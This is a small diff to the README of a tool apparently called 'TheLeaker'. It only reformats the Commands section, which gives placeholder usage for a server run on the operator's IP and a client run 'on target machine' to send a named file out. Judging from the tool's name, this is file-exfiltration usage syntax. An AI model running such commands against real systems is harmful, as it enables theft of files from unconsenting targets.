@@ -13,8 +13,8 @@ TheLeaker has two binaries: "theleaker-client" and "theleaker-server".
 - theleaker-client: must be run on target machine
 
 # Commands
-theleaker-server [your ip]
-theleaker-client -s [target] -f [filename] -R [router ip] -r [rename file]
+- theleaker-server [your ip]
+- theleaker-client -s [target] -f [filename] -R [router ip] -r [rename file]
 
 # Example
 
